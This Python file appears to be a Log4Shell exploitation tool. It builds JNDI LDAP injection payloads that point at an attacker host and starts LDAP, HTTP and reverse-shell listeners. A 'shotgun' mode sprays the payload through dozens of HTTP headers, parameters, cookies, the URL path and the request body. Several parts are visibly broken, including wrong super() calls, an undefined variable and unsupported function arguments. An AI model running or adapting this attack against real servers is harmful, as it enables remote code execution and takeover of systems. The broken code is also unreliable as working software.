import multiprocessing
import string
import time
import json
import urllib.parse
import urllib.request
from logger import Logger, Color
from handlers import LDAP, HTTP, ReverseShellListener
from threading import Thread


def request(method, url, data=None, params=None, headers=None, data_as_json=True, error_count=0):
    body = None
    headers = headers or {}
    headers = {"Accept": "*/*", **headers}
    data = data or {}
    params = params or {}

    if params:
        url += "?" + urllib.parse.urlencode(params, doseq=True, safe="/")

    if data:
        if data_as_json:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json; charset=UTF-8"
        else:
            body = urllib.parse.urlencode(data).encode()

    httprequest = urllib.request.Request(url, data=body, headers=headers, method=method)
    urllib.request.urlopen(httprequest)


class Attack:
    def __init__(self, lhost, java_payload, ldap_port, http_port):
        self.lhost = lhost
        self.ldap_port = ldap_port
        self.http_port = http_port
        self.query_name = "LegitimateJavaClass"
        self.java_payload = java_payload
        self.jndi_payload = '${jndi:ldap://' + f'{self.lhost}:{self.ldap_port}/{self.query_name}' + '}'
        self.logger = Logger(self.__class__.__name__)
        self.processes = []

    def start_process(self, target, args):
        processes = self.processes
        self.processes = None
        # process = multiprocessing.Process(target=target, args=args)
        process = Thread(target=target, args=args)
        process.setDaemon(True)
        process.start()
        processes.append(process)
        self.processes = processes

    def server_processes(self):
        self.start_process(target=LDAP, args=[self.lhost, self.ldap_port, self.query_name, self.http_port, self.java_payload])
        self.start_process(target=HTTP, args=[self.lhost, self.http_port, self.java_payload])
        self.start_process(target=self.java_payload.run, args=[])

    def kill_server_processes(self):
        self.logger.warn('Killing listeners')
        exit()
        for process in self.processes:
            process.kill()

    def trigger_vulnerability(self):
        raise NotImplementedError()

    def attack(self):
        try:
            self.server_processes()
            self.trigger_vulnerability()
            for p in self.processes:
                p.join()
        except KeyboardInterrupt:
            self.kill_server_processes()


class ManualAttack(Attack):
    """
    Simply print the JNDI payload and start the callback listeners. You have to manually send the payload to the server.
    """

    def trigger_vulnerability(self):
        self.logger.info('Send the following JNDI payload somewhere to your vulnerable server:')
        self.logger.info('-'*30)
        self.logger.info(Color.NORMAL + Color.GREEN + self.jndi_payload + Color.END)
        self.logger.info('-'*30)


class HTTPHeaderAttack(Attack):
    """
    Send a single HTTP request with the JNDI payload in the specified header.
    """

    def __init__(self, lhost, java_payload, ldap_port, http_port, method, target_url, header_name):
        self.method = method
        self.header_name = header_name
        self.target_url = target_url
        super(Attack, self).__init__(lhost, java_payload, ldap_port, http_port)

    def trigger_vulnerability(self):
        self.logger.info(f'Sending JNDI payload in header {self.header_name} with method {self.method}')
        headers = {header_name: self.jndi_payload}
        request(self.method, self.target_url, headers=headers)


class HTTPShotgunAttack(Attack):
    """
    Aggressive Shotgun Attack. Spray the JNDI payload in different headers, params, cookies, path and body. Hope that something gets logged and triggers.
    """

    def __init__(self, lhost, java_payload, ldap_port, http_port, target_url):
        self.target_url = target_url
        super(Attack, self).__init__(lhost, java_payload, ldap_port, http_port)

    def trigger_vulnerability(self):
        self.logger.info('Starting Shotgun Attack')
        jndi = self.jndi_payload

        header_names = ['Akamai-Origin-Hop', 'CF-Connecting-IP', 'Proxy-Client-IP', 'Source-IP', 'Via', 'WL-Proxy-Client-IP', 'User-Agent', 'X-BlueCoat-Via', 'X-From-IP', 'X-Original-Hostname', 'X-ProxyMesh-IP', 'X-ProxyUser-IP', 'Z-Forwarded-For', 'Orgion', 'Referer', 'C-IP', 'Client-IP', 'Cluster-Client-IP', 'Cluster-IP', 'Forwarded', 'Forwarded-For', 'Forwarded-Host', 'Forwarded-HTTPS', 'Forwarder', 'Forwarder-For', 'Forwarder-Host', 'Forwarding', 'Forwarding-For', 'Forwarding-Host', 'Host', 'Host-IP', 'IP', 'Origin-IP', 'Originating-IP', 'Proxy', 'Proxy-IP', 'Real-Client-IP', 'Real-IP', 'Remote-Addr', 'Remote-IP', 'Server-IP', 'True-Client',
                        'True-Client-IP', 'X-C-IP', 'X-Client-IP', 'X-Cluster-Client-IP', 'X-Cluster-IP', 'X-Forwarded', 'X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-HTTPS', 'X-Forwarded-Server', 'X-Forwarder', 'X-Forwarder-For', 'X-Forwarder-Host', 'X-Forwarding', 'X-Forwarding-For', 'X-Forwarding-Host', 'X-Host', 'X-Host-IP', 'X-IP', 'X-Origin', 'X-Origin-Host', 'X-Origin-IP', 'X-Original-For', 'X-Original-Host', 'X-Original-IP', 'X-Originating-Host', 'X-Originating-IP', 'X-Port', 'X-Proxy', 'X-Proxy-IP', 'X-Real-Client-IP', 'X-Real-IP', 'X-Remote-Addr', 'X-Remote-IP', 'X-Server', 'X-Server-IP', 'X-True-Client', 'X-True-Client-IP', 'X-Api-Version']
        headers = {name: jndi for name in header_names}
        params = {name: jndi for name in string.ascii_letters}
        params[jndi] = jndi
        cookies = {cookie: jndi for cookie in ['cookie', 'session', 'auth', 'user', 'login', 'version', 'id', jndi]}
        path = self.target_url + "/" + jndi
        data = {name: jndi for name in string.ascii_letters}
        data[jndi] = jndi

        count = {}
        for method in ['GET', 'POST', 'PUT', 'DELETE']:
            for as_json in [True, False]:
                for url in [path, self.target_url]:
                    if method not in count:
                        count[method] = 0
                    count[method] += 1
                    request(method, url, data=data, headers=headers, cookies=cookies, params=params, as_json=as_json)

        count_str = ''.join({f'{v} {k}' for k, v in count.items()})
        self.logger.info(f'Sent {sum(count.values())} requests ({count_str}).')
        self.logger.info(f'Tried {len(headers)} header, {len(params)} params, {len(cookies)} cookies and {len(data)} body injections for each request.')
